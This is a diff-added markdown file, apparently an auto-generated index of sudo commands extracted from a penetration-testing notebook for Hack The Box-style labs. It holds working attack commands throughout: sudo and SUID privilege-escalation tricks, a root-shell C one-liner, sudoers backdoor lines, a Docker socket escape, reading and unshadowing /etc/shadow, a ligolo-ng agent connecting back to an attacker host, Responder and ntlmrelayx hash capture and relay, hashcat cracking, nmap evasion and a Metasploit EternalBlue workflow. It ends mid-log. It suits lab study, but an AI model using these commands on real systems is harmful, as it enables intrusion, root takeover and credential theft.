+sudo ip route add AD_SUBNET dev ligolo
+```
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+sudo ip route add 10.10.10.0/24 dev ligolo
+```
+
+</Accordion>
+
+<Accordion title="Cleanup">
+
+### Cleanup
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+sudo ip route del AD_SUBNET dev ligolo
+```
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+sudo ip route del 10.10.10.0/24 dev ligolo
+```
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+sudo ip link delete ligolo
+```
+
+</Accordion>
+
+<Accordion title="Ligolo-ng: Quick Reference">
+
+### Ligolo-ng: Quick Reference
+
+**Ligolo-ng: Quick Reference**
+
+```bash
+# Attacker (once)
+sudo ip tuntap add user $USER mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+# Victim (agent) connects back
+./agent -connect ATTACKER:11601 -ignore-cert
+```
+
+**Ligolo-ng: Quick Reference**
+
+```bash
+# In the ligolo proxy console
+session            # pick the agent
+# Then on the attacker box: add a route to the internal subnet via ligolo
+sudo ip route add 172.16.5.0/24 dev ligolo
+# now reach hosts directly
+nxc smb 172.16.5.19
+```
+
+</Accordion>
+
+<Accordion title="Linux Authentication: PAM, passwd, and shadow">
+
+### Linux Authentication: PAM, passwd, and shadow
+
+**Linux Authentication: PAM, passwd, and shadow**
+
+```bash
+grcic550@htb[/htb]$ sudo cat /etc/security/opasswd
+
+cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
+```
+
+**Linux Authentication: PAM, passwd, and shadow**
+
+```bash
+sudo cp /etc/passwd /tmp/passwd.bak
+sudo cp /etc/shadow /tmp/shadow.bak
+
+unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadow.hashes
+```
+
+</Accordion>
+
+<Accordion title="CVE-2019-14287">
+
+### CVE-2019-14287
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+# Exploitable when a user have the following permissions (sudo -l)
+(ALL, !root) ALL
+
+# If you have a full TTY, you can exploit it like this
+sudo -u#-1 /bin/bash
+sudo -u#4294967295 id
+```
+
+</Accordion>
+
+<Accordion title="Create a SUID binary">
+
+### Create a SUID binary
+
+**Linux Privilege Escalation: Full Checklist**
+
+```bash
+print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
+gcc -o /tmp/suid /tmp/suid.c  
+sudo chmod +x /tmp/suid # execute right
+sudo chmod +s /tmp/suid # setuid bit
+```
+
+</Accordion>
+
+<Accordion title="Docker">
+
+### Docker
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+```
+
+</Accordion>
+
+<Accordion title="Interesting capabilities">
+
+### Interesting capabilities
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
+
+$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+sh-5.0# id
+uid=0(root) gid=1000(swissky)
+```
+
+</Accordion>
+
+<Accordion title="NOPASSWD">
+
+### NOPASSWD
+
+**Linux Privilege Escalation: Full Checklist**
+
+```bash
+$ sudo -l
+
+User demo may run the following commands on crashlab:
+    (root) NOPASSWD: /usr/bin/vim
+```
+
+**Linux Privilege Escalation: Full Checklist**
+
+```bash
+sudo vim -c '!sh'
+sudo -u root vim -c '!sh'
+```
+
+</Accordion>
+
+<Accordion title="SUID">
+
+### SUID
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+╭─swissky@lab ~  
+╰─$ ls /usr/bin/sudo -alh                  
+-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo
+```
+
+</Accordion>
+
+<Accordion title="Tools">
+
+### Tools
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
+curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o linpeas.sh
+./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.
+./linpeas.sh -s #superfast & stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.
+./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users
+```
+
+</Accordion>
+
+<Accordion title="Writable /etc/sudoers">
+
+### Writable /etc/sudoers
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
+
+# use SUDO without password
+echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
+echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
+```
+
+</Accordion>
+
+<Accordion title="sudo_inject">
+
+### sudo_inject
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+$ sudo whatever
+[sudo] password for user:    
+# Press <ctrl>+c since you don't have the password. 
+# This creates an invalid sudo tokens.
+$ sh exploit.sh
+.... wait 1 seconds
+$ sudo -i # no password required :)
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+</Accordion>
+
+<Accordion title="Rsync">
+
+### Rsync
+
+**Linux Remote Access: SSH, Rsync, and R-Services**
+
+```bash
+sudo nmap -sV -p 873 <IP>
+nc -nv <IP> 873          # then send: @RSYNCD: 31.0  /  #list   to enumerate modules
+
+rsync -av --list-only rsync://<IP>/<share>     # list a share's contents
+rsync -av rsync://<IP>/<share> ./loot/          # download everything
+rsync -av -e "ssh -p2222" rsync://<IP>/<share> ./loot/   # over SSH, custom port
+```
+
+</Accordion>
+
+<Accordion title="Starting up &amp; the database">
+
+### Starting up & the database
+
+**Metasploit Framework: Startup to Sessions**
+
+```bash
+sudo msfdb init        # set up the PostgreSQL database (once)
+msfconsole -q          # launch the console (-q = no banner)
+msf6 > db_status       # confirm DB connected
+msf6 > workspace -a engagement1   # separate workspaces per engagement
+```
+
+</Accordion>
+
+<Accordion title="Footprinting &amp; scanning">
+
+### Footprinting & scanning
+
+**Microsoft SQL Server Enumeration**
+
+```bash
+# Nmap script sweep (version, blank sa pw, xp_cmdshell, config, NTLM info)
+sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info,ms-sql-xp-cmdshell,ms-sql-config -sV -p1433 <IP>
+
+# Metasploit ping sweep (UDP 1434 → instance/version/port)
+msfconsole -q
+use auxiliary/scanner/mssql/mssql_ping
+set RHOSTS <IP>
+run
+```
+
+**MySQL and MariaDB Enumeration**
+
+```bash
+sudo nmap <IP> -sV -sC -p3306 --script mysql*
+```
+
+</Accordion>
+
+<Accordion title="When you don&#x27;t have sysadmin: steal the service account&#x27;s hash with xp_dirtree">
+
+### When you don't have sysadmin: steal the service account's hash with xp_dirtree
+
+**Microsoft SQL Server Enumeration**
+
+```bash
+# 1. On your box, listen for the inbound authentication
+sudo responder -I tun0                 # capture the NetNTLM hash to crack offline
+# (or) sudo impacket-ntlmrelayx -t <other-host> -smb2support   # relay it instead of cracking
+```
+
+</Accordion>
+
+<Accordion title="2. Mount and browse">
+
+### 2. Mount and browse
+
+**NFS Enumeration and Exports**
+
+```bash
+mkdir /tmp/nfs
+sudo mount -t nfs <IP>:/<export> /tmp/nfs -o nolock   # mount the share locally
+sudo ls -la /tmp/nfs                                   # browse with sudo (UID issues, see below)
+sudo cat /tmp/nfs/<file>
+```
+
+**NFS Enumeration and Exports**
+
+Context from the notebook: Exported files often show owners like  nobody  or a specific UID with  drwx------ . Your normal user's UID won't match, so listing/reading fails —  sudo  (UID 0) sidesteps it for browsing. If a file is owned by a  specific  UID you need to act as, create a matching local user ( sudo useradd -u &lt;UID> tempuser ) and  su  to it.
+
+```text
+sudo useradd -u <UID> tempuser
+```
+
+</Accordion>
+
+<Accordion title="3. Clean up">
+
+### 3. Clean up
+
+**NFS Enumeration and Exports**
+
+```bash
+sudo umount /tmp/nfs
+sudo umount -f /tmp/nfs    # force, if it won't release
+sudo umount -l /tmp/nfs    # lazy unmount — use if the mount hangs
+```
+
+</Accordion>
+
+<Accordion title="A practical scan sequence">
+
+### A practical scan sequence
+
+**Nmap: Host Discovery, Scanning, and Output**
+
+```bash
+# 1. discover live hosts
+sudo nmap -sn 10.10.10.0/24 -oA hosts
+
+# 2. fast full-port sweep on a target (find everything open)
+sudo nmap -p- --min-rate 5000 -Pn 10.10.10.10 -oA allports
+
+# 3. deep scan on the open ports only
+sudo nmap -sCV -p 22,80,445 -Pn 10.10.10.10 -oA services
+
+# 4. UDP pass on common ports (don't forget this)
+sudo nmap -sU --top-ports 50 -Pn 10.10.10.10 -oA udp
+```
+
+</Accordion>
+
+<Accordion title="Firewall / IDS evasion (concept-level)">
+
+### Firewall / IDS evasion (concept-level)
+
+**Nmap: Host Discovery, Scanning, and Output**
+
+```bash
+sudo nmap -f <target>                  # fragment packets (split headers)
+sudo nmap -D RND:10 <target>           # decoys: hide your real IP among fakes
+sudo nmap -g 53 <target>               # spoof source port 53 (often allowed through)
+sudo nmap --data-length 25 <target>    # pad packets to dodge signatures
+sudo nmap -sS <target>                 # SYN scan already avoids app logs
+```
+
+</Accordion>
+
+<Accordion title="How TCP scanning actually works">
+
+### How TCP scanning actually works
+
+**Nmap: Host Discovery, Scanning, and Output**
+
+```bash
+sudo nmap -sS <target>             # SYN scan (default as root)
+nmap -sT <target>                  # TCP connect (no root needed)
+sudo nmap -sU <target>             # UDP scan
+```
+
+</Accordion>
+
+<Accordion title="Nmap Scripting Engine (NSE) — -sC / --script">
+
+### Nmap Scripting Engine (NSE) — -sC / --script
+
+**Nmap: Host Discovery, Scanning, and Output**
+
+```bash
+sudo nmap -sC <target>                         # run the "default" safe script set
+nmap --script vuln <target>                    # known-vuln checks
+nmap --script smb-os-discovery -p445 <target>  # a specific script
+nmap --script "http-*" -p80 <target>           # wildcard: all http scripts
+```
+
+</Accordion>
+
+<Accordion title="Port selection">
+
+### Port selection
+
+**Nmap: Host Discovery, Scanning, and Output**
+
+```bash
+nmap -p- --min-rate 5000 <target>          # find every open port fast
+sudo nmap -sCV -p 22,80,445 <target>       # then -sC -sV only on those
+```
+
+</Accordion>
+
+<Accordion title="Service &amp; version detection (-sV) and OS detection (-O)">
+
+### Service & version detection (-sV) and OS detection (-O)
+
+**Nmap: Host Discovery, Scanning, and Output**
+
+```bash
+sudo nmap -sV <target>             # probe each open port for product + version
+sudo nmap -O <target>              # guess OS from TCP/IP stack fingerprint
+sudo nmap -A <target>              # aggressive: -sV + -O + default scripts + traceroute
+```
+
+</Accordion>
+
+<Accordion title="Footprinting &amp; SID enumeration">
+
+### Footprinting & SID enumeration
+
+**Oracle Database and TNS Enumeration**
+
+```bash
+sudo nmap -p1521 -sV <IP> --open                          # version + confirm listener
+sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute # brute-force SIDs
+
+# ODAT (Oracle Database Attacking Tool)
+python3 odat.py sidguesser -s <IP> -p 1521                 # find valid SIDs
+python3 odat.py passwordguesser -s <IP> -p 1521 -d XE      # brute creds for SID XE
+python3 odat.py all -s <IP> -d XE -U <user> -P <pass>      # run every attack module
+```
+
+</Accordion>
+
+<Accordion title="Step 0 — confirm the relay target exists">
+
+### Step 0 — confirm the relay target exists
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+```bash
+echo "10.129.234.172  CA01.inlanefreight.local"            | sudo tee -a /etc/hosts
+echo "10.129.234.174  DC01.inlanefreight.local dc01 inlanefreight.local" | sudo tee -a /etc/hosts
+
+certipy find -u wwhite@inlanefreight.local -p 'package5shores_topher1' -dc-ip 10.129.234.174 -stdout
+curl -s --max-time 8 -o /dev/null -w "HTTP %{http_code}\n" http://10.129.234.172/certsrv/   # 401 = web enrollment live
+```
+
+</Accordion>
+
+<Accordion title="Troubleshooting log (everything that bit me, and the fix)">
+
+### Troubleshooting log (everything that bit me, and the fix)
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+```bash
+sudo ip link set dev tun0 mtu 1200      # drop further to 1100 if needed
+```
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+Context from the notebook: certipy auth  / PKINIT reset, clock looks right Often still clock skew — your clock must match the  DC , not internet NTP (labs run their own time) sudo timedatectl set-ntp off ; read DC time  nmap -p445 --script smb2-time &lt;DC> ;  sudo date -u -s "..." . Verify  date -u  ≈ DC within 5 min
+
+```text
+sudo timedatectl set-ntp off
+```
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+Context from the notebook: certipy auth  / PKINIT reset, clock looks right Often still clock skew — your clock must match the  DC , not internet NTP (labs run their own time) sudo timedatectl set-ntp off ; read DC time  nmap -p445 --script smb2-time &lt;DC> ;  sudo date -u -s "..." . Verify  date -u  ≈ DC within 5 min
+
+```text
+sudo date -u -s "..."
+```
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+Context from the notebook: Back it up first ( sudo cp /etc/ssl/openssl.cnf&#123;,.bak&#125; ). If it already has an  [openssl_init] , add  ssl_conf = ssl_sect   into  it rather than duplicating.
+
+```text
+sudo cp /etc/ssl/openssl.cnf{,.bak}
+```
+
+</Accordion>
+
+<Accordion title="Check Domain Membership">
+
+### Check Domain Membership
+
+**Pass the Ticket from Linux**
+
+```bash
+sudo grep -i "access\|allow\|simple" /etc/sssd/sssd.conf   # look for simple_allow_groups / simple_allow_users
+```
+
+</Accordion>
+
+<Accordion title="Checking User Privileges">
+
+### Checking User Privileges
+
+**Pass the Ticket from Linux**
+
+```bash
+sudo su
+```
+
+</Accordion>
+
+<Accordion title="Linikatz">
+
+### Linikatz
+
+**Pass the Ticket from Linux**
+
+```bash
+sudo ./linikatz.sh
+```
+
+</Accordion>
+
+<Accordion title="Step 2 — Route tools through the proxy (proxychains)">
+
+### Step 2 — Route tools through the proxy (proxychains)
+
+**Pass the Ticket from Linux**
+
+```bash
+sudo nano /etc/proxychains4.conf
+```
+
+</Accordion>
+
+<Accordion title="Using Evil-WinRM With Kerberos">
+
+### Using Evil-WinRM With Kerberos
+
+**Pass the Ticket from Linux**
+
+```bash
+sudo apt install krb5-user
+```
+
+</Accordion>
+
+<Accordion title="11. Attacking SAM, SYSTEM &amp; SECURITY">
+
+### 11. Attacking SAM, SYSTEM & SECURITY
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+# attacker:
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/you/Documents/
+```
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
+```
+
+</Accordion>
+
+<Accordion title="BitLocker-encrypted drives">
+
+### BitLocker-encrypted drives
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+sudo apt-get install dislocker
+sudo mkdir -p /media/bitlocker /media/bitlockermount
+sudo losetup -f -P Backup.vhd
+sudo dislocker /dev/loop0p2 -u<PASSWORD> -- /media/bitlocker
+sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
+# when done:
+sudo umount /media/bitlockermount && sudo umount /media/bitlocker
+```
+
+</Accordion>
+
+<Accordion title="NetExec (the multi-protocol workhorse)">
+
+### NetExec (the multi-protocol workhorse)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+sudo apt-get -y install netexec
+netexec -h                              # general help
+netexec smb -h                          # protocol-specific options
+netexec <proto> <target> -u <user|userlist> -p <pass|passlist>
+```
+
+</Accordion>
+
+<Accordion title="Parse the dump offline with pypykatz">
+
+### Parse the dump offline with pypykatz
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+```
+
+</Accordion>
+
+<Accordion title="3. ligolo‑ng (transparent TUN — best for RDP/scanning)">
+
+### 3. ligolo‑ng (transparent TUN — best for RDP/scanning)
+
+**Pivoting and File Transfer: Field Reference**
+
+```bash
+# Kali — one-time interface setup
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+# Kali — start the proxy (listens on 11601)
+sudo ./proxy -selfcert
+# pivot host — run the agent (upload it first)
+./agent -connect <KALI_IP>:11601 -ignore-cert
+# Kali — in the ligolo console:
+session            # pick the agent
+start              # activate the tunnel
+# Kali — route the internal subnet through ligolo
+sudo ip route add 172.16.119.0/24 dev ligolo
+# now everything just works:
+nxc smb 172.16.119.11 -u user -p pass
+xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'...' /cert:ignore
+nmap -sT 172.16.119.0/24
+```
+
+</Accordion>
+
+<Accordion title="🚨 THE MTU TRAP">
+
+### 🚨 THE MTU TRAP
+
+**Pivoting and File Transfer: Field Reference**
+
+```bash
+sudo ip link set dev tun0 mtu 1200      # drop to 1100 if still flaky
+```
+
+</Accordion>
+
+<Accordion title="Quick-start command cheat (run first, always)">
+
+### Quick-start command cheat (run first, always)
+
+**Privilege Escalation: Choose a Checklist**
+
+```bash
+# 1. Automated
+wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.out
+
+# 2. Manual "big 6"
+id; sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; cat /etc/crontab; uname -a
+```
+
+</Accordion>
+
+<Accordion title="POP3 vs IMAP — two very different models">
+
+### POP3 vs IMAP — two very different models
+
+**Read and Search Email with POP3 and IMAP**
+
+```bash
+sudo nmap -sV -p 110,143,993,995 --script "pop3-capabilities,imap-capabilities" <IP>
+```
+
+</Accordion>
+
+<Accordion title="Responder — Interface and Startup">
+
+### Responder — Interface and Startup
+
+**Responder — Interface and Startup**
+
+```bash
+sudo responder -I LAB_INTERFACE -A
+```
+
+</Accordion>
+
+<Accordion title="SMTP Status Code Lookup">
+
+### SMTP Status Code Lookup
+
+**SMTP Status Code Lookup**
+
+```bash
+sudo nmap -p25 -sV --script smtp-commands,smtp-enum-users <IP>
+telnet <IP> 25      # then: HELO x / VRFY root / EXPN admin / RCPT TO:<ext@dom>
+```
+
+</Accordion>
+
+<Accordion title="How devices organise their data: OIDs and the MIB">
+
+### How devices organise their data: OIDs and the MIB
+
+**SNMP Enumeration, OIDs, and Community Strings**
+
+```bash
+sudo nmap -sU -p 161 --script snmp-info <Target-IP>   # detect agent + pull basic device info
+```
+
+</Accordion>
+
+<Accordion title="After Spawning TTY — Check Privileges">
+
+### After Spawning TTY — Check Privileges
+
+**Shells, Payloads, and Interactive TTYs**
+
+```bash
+# Check sudo permissions
+sudo -l
+
+# Check file permissions
+ls -la /path/to/file
+
+# If NOPASSWD: ALL → instant root
+sudo /bin/bash
+```
+
+</Accordion>
+
+<Accordion title="Fingerprinting">
+
+### Fingerprinting
+
+**Shells, Payloads, and Interactive TTYs**
+
+```bash
+# TTL check (128 = Windows, 64 = Linux)
+ping <target_ip>
+
+# Nmap OS detection
+sudo nmap -v -O <target_ip>
+
+# Banner grabbing
+sudo nmap -v <target_ip> --script banner.nse
+
+# Full enumeration
+nmap -v -A <target_ip>
+```
+
+</Accordion>
+
+<Accordion title="Metasploit Basic Workflow">
+
+### Metasploit Basic Workflow
+
+**Shells, Payloads, and Interactive TTYs**
+
+```bash
+# Start Metasploit
+sudo msfconsole
+
+# Search for exploits
+msf6 > search smb
+msf6 > search eternalblue
+
+# Select a module
+msf6 > use exploit/windows/smb/ms17_010_psexec
+
+# View required options
+msf6 exploit(...) > options
+
+# Set options
+msf6 exploit(...) > set RHOSTS <target_ip>
+msf6 exploit(...) > set LHOST <your_ip>
+msf6 exploit(...) > set LPORT 4444
+msf6 exploit(...) > set SMBUser <username>
+msf6 exploit(...) > set SMBPass <password>
+
+# Run the exploit
+msf6 exploit(...) > exploit
+
+# Inside Meterpreter
+meterpreter > getuid          # Check user context
+meterpreter > shell           # Drop to native OS shell
+meterpreter > upload <file>   # Upload file
+meterpreter > download <file> # Download file
+```
+
+</Accordion>
+
+<Accordion title="Netcat Listener (Attack Box)">
+
+### Netcat Listener (Attack Box)
+
+**Shells, Payloads, and Interactive TTYs**
+
+```bash
+sudo nc -lvnp 443
+```
+
+</Accordion>
+
+<Accordion title="Change Admin Password">
+
+### Change Admin Password
+
+**Vulnerability Assessment, Nessus, and OpenVAS**
+
+```bash
+sudo runuser -u _gvm -- gvmd --user=admin --new-password='NewPassword'
+```
+
+</Accordion>
+
+<Accordion title="Docker Install (Greenbone Community Edition)">
+
+### Docker Install (Greenbone Community Edition)
+
+**Vulnerability Assessment, Nessus, and OpenVAS**
+
+```bash
+mkdir -p ~/greenbone && cd ~/greenbone
+curl -f -O -L https://greenbone.github.io/docs/latest/_static/compose.yaml
+sudo docker compose up -d
+# Access at https://localhost:9392 — admin/admin
+```
+
+</Accordion>
+
+<Accordion title="Installation">
+
+### Installation
+
+**Vulnerability Assessment, Nessus, and OpenVAS**
+
+```bash
+# Kali/Parrot
+sudo apt update && sudo apt install gvm -y
+sudo gvm-setup     # Takes 20-30 min, prints admin password at end
+sudo gvm-start     # Starts the service
+
+# Web interface
+https://localhost:9392
+# Default: admin / <password from setup>
+```
+
+</Accordion>
+
+<Accordion title="Key Commands">
+
+### Key Commands
+
+**Vulnerability Assessment, Nessus, and OpenVAS**
+
+```bash
+# Install (Debian/Ubuntu)
+sudo dpkg -i Nessus-<version>.deb
+
+# Start/Stop
+sudo systemctl start nessusd
+sudo systemctl stop nessusd
+
+# Register (CLI)
+sudo /opt/nessus/sbin/nessuscli fetch --register <activation-code>
+
+# Reset registration
+sudo /opt/nessus/sbin/nessuscli fix --reset
+
+# Web interface
+https://localhost:8834
+```
+
+</Accordion>
+
+<Accordion title="Find or install the command">
+
+### Find or install the command
+
+**psexec.py - SMB remote shell**
+
+```bash
+command -v impacket-psexec
+command -v psexec.py
+impacket-psexec -h
+
+# Kali package, if the command is missing
+sudo apt install impacket-scripts
+```
+
+</Accordion>
+
+<Accordion title="🚨 GLOBAL CAVEATS (the stuff that wasted hours)">
+
+### 🚨 GLOBAL CAVEATS (the stuff that wasted hours)
+
+**Active Directory Attack Path: Worked Lab**
+
+Context from the notebook: SSH/PKINIT/LDAPS  connects then hangs , or "Connection reset by peer", while ping/ nc -z  work VPN MTU  — large packets fragment & drop; small ones pass sudo ip link set dev tun0 mtu 1200
+
+```text
+sudo ip link set dev tun0 mtu 1200
+```
+
+</Accordion>
+
+<Accordion title="Troubleshooting">
+
+### Troubleshooting
+
+**BloodHound — Start, Collect, and Import**
+
+Context from the notebook: First-time setup requested Run  sudo bloodhound-setup  once and follow its database-configuration instructions.
+
+```text
+sudo bloodhound-setup
+```
+
+**BloodHound — Start, Collect, and Import**
+
+Context from the notebook: Service does not start Check  sudo systemctl status bloodhound postgresql --no-pager  and  sudo neo4j status .
+
+```text
+sudo systemctl status bloodhound postgresql --no-pager
+```
+
+**BloodHound — Start, Collect, and Import**
+
+Context from the notebook: Service does not start Check  sudo systemctl status bloodhound postgresql --no-pager  and  sudo neo4j status .
+
+```text
+sudo neo4j status
+```
+
+**BloodHound — Start, Collect, and Import**
+
+Context from the notebook: Need the application error Run  sudo journalctl -u bloodhound -n 80 --no-pager .
+
+```text
+sudo journalctl -u bloodhound -n 80 --no-pager
+```
+
+</Accordion>
+
+<Accordion title="Key Principles">
+
+### Key Principles
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+Context from the notebook: 8. Unmount NFS When Done.  Stale NFS mounts freeze your terminal. Always  sudo umount -l  when the target changes.
+
+```text
+sudo umount -l
+```
+
+</Accordion>
+
+<Accordion title="History (stop re-typing)">
+
+### History (stop re-typing)
+
+**Kali Terminal, tmux, zsh, and Vim**
+
+Context from the notebook: !! the entire last command (e.g.  sudo !! )
+
+```text
+sudo !!
+```
+
+</Accordion>
+
+<Accordion title="LD_PRELOAD and NOPASSWD">
+
+### LD_PRELOAD and NOPASSWD
+
+**Linux Privilege Escalation: Full Checklist**
+
+Context from the notebook: Execute any binary with the LD_PRELOAD to spawn a shell :  sudo LD_PRELOAD=&lt;full_path_to_so_file> &lt;program> , e.g:  sudo LD_PRELOAD=/tmp/shell.so find
+
+```text
+sudo LD_PRELOAD=<full_path_to_so_file> <program>
+```
+
+**Linux Privilege Escalation: Full Checklist**
+
+Context from the notebook: Execute any binary with the LD_PRELOAD to spawn a shell :  sudo LD_PRELOAD=&lt;full_path_to_so_file> &lt;program> , e.g:  sudo LD_PRELOAD=/tmp/shell.so find
+
+```text
+sudo LD_PRELOAD=/tmp/shell.so find
+```
+
+</Accordion>
+
+<Accordion title="Quick reference">
+
+### Quick reference
+
+**NFS Enumeration and Exports**
+
+Context from the notebook: First move showmount -e &lt;IP>  →  sudo mount -t nfs &lt;IP>:/&lt;export> /tmp/nfs
+
+```text
+sudo mount -t nfs <IP>:/<export> /tmp/nfs
+```
+
+</Accordion>
+
+<Accordion title="5 · Vulnerability Assessment">
+
+### 5 · Vulnerability Assessment
+
+**Original Box Checklist — Historical Plan**
+
+Context from the notebook: Shocker  🟩 Easy 🔺PE — Shellshock →  sudo perl
+
+```text
+sudo perl
+```
+
+</Accordion>
+
+<Accordion title="Troubleshooting quick reference">
+
+### Troubleshooting quick reference
+
+**Pass the Ticket from Linux**
+
+Context from the notebook: Kerberos ticket expired  even on a fresh ticket / KDC reached OK Clock skew  — your attack host's time differs from the domain's (HTB labs run on a fixed date, e.g. 2022). Kerberos compares timestamps, so the ticket looks expired Set your clock into the ticket's  Valid starting – Expires  window:  sudo timedatectl set-ntp off; sudo date -s "2022-10-07 12:00:00"  — or sync to the DC:  sudo ntpdate -u &lt;DC_IP> . Restore later with  sudo timedatectl set-ntp on
+
+```text
+sudo timedatectl set-ntp off; sudo date -s "2022-10-07 12:00:00"
+```
+
+**Pass the Ticket from Linux**
+
+Context from the notebook: Kerberos ticket expired  even on a fresh ticket / KDC reached OK Clock skew  — your attack host's time differs from the domain's (HTB labs run on a fixed date, e.g. 2022). Kerberos compares timestamps, so the ticket looks expired Set your clock into the ticket's  Valid starting – Expires  window:  sudo timedatectl set-ntp off; sudo date -s "2022-10-07 12:00:00"  — or sync to the DC:  sudo ntpdate -u &lt;DC_IP> . Restore later with  sudo timedatectl set-ntp on
+
+```text
+sudo ntpdate -u <DC_IP>
+```
+
+**Pass the Ticket from Linux**
+
+Context from the notebook: Kerberos ticket expired  even on a fresh ticket / KDC reached OK Clock skew  — your attack host's time differs from the domain's (HTB labs run on a fixed date, e.g. 2022). Kerberos compares timestamps, so the ticket looks expired Set your clock into the ticket's  Valid starting – Expires  window:  sudo timedatectl set-ntp off; sudo date -s "2022-10-07 12:00:00"  — or sync to the DC:  sudo ntpdate -u &lt;DC_IP> . Restore later with  sudo timedatectl set-ntp on
+
+```text
+sudo timedatectl set-ntp on
+```
+
+</Accordion>
+
+<Accordion title="Which machine runs what (read this first)">
+
+### Which machine runs what (read this first)
+
+**Pass the Ticket from Linux**
+
+Context from the notebook: The Kerberos client tools come from the  krb5-user  package:  sudo apt install -y krb5-user . Install prompts —  default realm:   INLANEFREIGHT.HTB  (uppercase);  Kerberos server / KDC:   dc01.inlanefreight.htb ; admin server can be the same or blank. You can fix any of these later in  /etc/krb5.conf . You don't strictly need  klist  to  use  a ticket (tools read  KRB5CCNAME  directly), but it's how you  verify  a ticket loaded and hasn't expired.
+
+```text
+sudo apt install -y krb5-user
+```
+
+</Accordion>
+
+<Accordion title="WinRM (5985/HTTP, 5986/HTTPS)">
+
+### WinRM (5985/HTTP, 5986/HTTPS)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+Context from the notebook: Installs via  sudo gem install evil-winrm . Gives a PowerShell Remoting session.
+
+```text
+sudo gem install evil-winrm
+```
+
+</Accordion>
+
+<Accordion title="Legacy BloodHound (neo4j + Electron)">
+
+### Legacy BloodHound (neo4j + Electron)
+
+**BloodHound: Full Reference · older reference**
+
+```bash
+sudo apt install -y bloodhound neo4j
+sudo neo4j start                       # browse http://localhost:7474, login neo4j/neo4j, set new pw
+bloodhound &                           # GUI: connect bolt://localhost:7687 with neo4j creds
+```
+
+</Accordion>
+
+<Accordion title="Catching Base64 Encoded Certificate for DC01">
+
+### Catching Base64 Encoded Certificate for DC01
+
+**Historical AD Vulnerability Labs · older reference**
+
+```shellsession
+grcic550@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
+
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[+] Protocol Attack DCSYNC loaded..
+[+] Protocol Attack HTTP loaded..
+[+] Protocol Attack HTTPS loaded..
+[+] Protocol Attack IMAP loaded..
+[+] Protocol Attack IMAPS loaded..
+[+] Protocol Attack LDAP loaded..
